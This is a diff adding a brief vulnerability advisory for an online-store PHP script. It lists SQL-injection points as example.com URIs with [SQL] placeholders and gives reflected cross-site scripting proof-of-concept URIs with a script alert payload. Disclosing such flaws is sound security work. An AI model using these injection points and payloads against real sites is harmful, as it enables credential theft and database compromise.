@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/46960/info
+
+Online store php script is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+SQL Injection URIs:
+====================
+
+http://www.example.com/detail.php?prodid=[SQL]
+http://www.example.com/view_wishlist.php?products_id=[SQL]
+http://www.example.com/moreImage.php?prod_id=[SQL]
+http://www.example.com/product2.php?loginn=confirmed&a=&b=&submit=+++Login+++.... [empty Query ]
+http://www.example.com/products.php?cid=21&sid=558&skip=[SQL]
+http://www.example.com/gstatus.php?code=[SQL]
+
+Cross Site Scripting URIs:
+==========================
+
+http://www.example.com/detail.php?prodid=<script>alert(1)</script>
+http://www.example.com/products.php?cid=21&sid=558&skip=<script>alert(1)</script>
+
